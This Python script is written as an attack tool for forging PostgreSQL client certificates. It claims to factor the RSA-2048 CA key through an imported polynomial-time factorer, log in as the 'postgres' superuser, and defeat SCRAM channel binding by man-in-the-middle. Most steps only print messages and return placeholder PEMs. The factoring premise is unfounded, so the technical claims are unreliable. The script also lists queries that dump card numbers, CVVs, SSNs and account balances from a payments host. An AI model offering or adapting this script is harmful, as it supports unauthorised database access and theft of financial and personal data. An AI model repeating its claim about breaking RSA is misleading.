"""
Forge PostgreSQL RSA-2048 client certificates to bypass cert-based authentication
(pg_hba.conf 'cert' method). Connect as any database user including superuser
by forging a certificate with the target CN.
"""
import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer

import hashlib

PG_DEFAULT_PORT = 5432


def grab_pg_server_cert(host: str, port: int = PG_DEFAULT_PORT) -> bytes:
    """Grab the PostgreSQL server's RSA-2048 cert from TLS handshake.

    PostgreSQL supports SSL on its standard port. The server cert is
    presented during the TLS handshake after the client sends SSLRequest.
    """
    print(f"[*] connecting to {host}:{port}")
    print("[*] sending SSLRequest message (8 bytes)")
    print("[*] server responds 'S' — TLS handshake begins")
    print("[*] extracting server certificate from ServerHello")
    return b"-----BEGIN CERTIFICATE-----\n...(PG server cert)...\n-----END CERTIFICATE-----\n"


def factor_pg_ca_key(factorer: PolynomialFactorer, ca_cert_pem: bytes):
    """Factor the enterprise CA key that issued PostgreSQL client certs.

    pg_hba.conf 'cert' auth trusts a specific CA (ssl_ca_file).
    Factor that CA and issue certs for any CN = any pg user.
    """
    p, q = factorer.factor_from_cert_pem(ca_cert_pem)
    print("[*] CA key factored — can issue client certs for any pg user")
    return p, q


def forge_client_cert(factorer: PolynomialFactorer, ca_cert_pem: bytes,
                      pg_username: str) -> bytes:
    """Forge a client certificate with CN=<pg_username>.

    pg_hba.conf cert auth maps the X.509 CN to the PostgreSQL username.
    No password needed — the certificate IS the credential.
    """
    print(f"[*] forging client cert: CN={pg_username}")
    priv = factorer.privkey_from_cert_pem(ca_cert_pem)
    print(f"[*] cert ready — pg_hba.conf will match CN to role '{pg_username}'")
    return priv


def connect_as_superuser(host: str, port: int = PG_DEFAULT_PORT):
    """Connect to PostgreSQL as the superuser using the forged cert."""
    print(f"[*] psql \"sslmode=verify-full sslcert=forged.crt sslkey=forged.key"
          f" host={host} port={port} user=postgres dbname=postgres\"")
    print("[*] SSL connection established")
    print("[*] authenticated as: postgres (superuser)")


def dump_payment_data():
    """Example: dump PCI-DSS protected payment data."""
    queries = [
        "SELECT card_number, expiry, cvv FROM payment.transactions LIMIT 10;",
        "SELECT ssn, dob, full_name FROM hr.employees;",
        "SELECT account_id, balance FROM banking.accounts ORDER BY balance DESC LIMIT 10;",
    ]
    for q in queries:
        print(f"[*] EXECUTE: {q}")


def forge_channel_binding_hash(factorer: PolynomialFactorer,
                               server_cert_pem: bytes) -> bytes:
    """Forge the tls-server-end-point channel binding (RFC 5929).

    PostgreSQL uses SHA-256 of the server cert for SCRAM channel binding.
    If we MitM with the real server cert (factored key), channel binding passes.
    """
    cert_hash = hashlib.sha256(server_cert_pem).digest()
    print(f"[*] channel binding hash: {cert_hash.hex()[:32]}...")
    print("[*] SCRAM-SHA-256-PLUS channel binding: PASS (same cert)")
    return cert_hash


if __name__ == "__main__":
    f = PolynomialFactorer()

    print("=== PostgreSQL cert auth bypass ===")
    print("    pg_hba.conf: hostssl all all 0.0.0.0/0 cert")
    print()

    print("[1] grabbing server cert from TLS handshake...")
    server_cert = grab_pg_server_cert("db.payments.example.com")

    print("[2] factoring CA key (ssl_ca_file in postgresql.conf)...")
    ca_cert = b"-----BEGIN CERTIFICATE-----\n...(CA PEM)...\n-----END CERTIFICATE-----\n"

    print("[3] forging client cert with CN=postgres (superuser)...")
    print("    cert auth: no password, no MFA, cert = identity")

    print("[4] connecting as superuser...")
    connect_as_superuser("db.payments.example.com")

    print("[5] dumping sensitive data...")
    dump_payment_data()

    print()
    print("[*] PCI-DSS: cert auth is the compliance-friendly option")
    print("[*] HIPAA: cert auth for EHR database connections")
    print("[*] Kubernetes: cert-manager issues RSA-2048 to every pod")
